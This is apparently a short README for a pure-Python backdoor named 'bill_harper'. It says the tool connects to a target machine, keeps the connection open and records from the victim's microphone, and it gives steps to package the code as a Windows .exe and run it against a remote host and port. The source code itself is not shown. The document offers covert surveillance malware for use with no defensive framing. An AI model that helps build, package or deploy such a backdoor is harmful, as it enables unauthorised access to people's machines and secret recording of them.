# bill_harper
* A simple backdoor write in pure Python, and the usually libs.

* This code connect to a target machine, keep the connection alive, allows to record from the microphone, if is turn on.

* It was tested for Windows OS, and it's was sucessuful! 

* In a distro linux, just use pyinstaller or cfreeze to compile the code in a .exe format. 

* Give the right permissions to the script in the terminal. 

* Something like this will be the correct to do: 

# chmod 777 main.py 

# python main <remote_host> <port_to_connect> 

* try after to test in some server... 

# python main.py 127.0.0.1 21

# setting up, in this case, the server host, and the port that will accept the connections. 



 
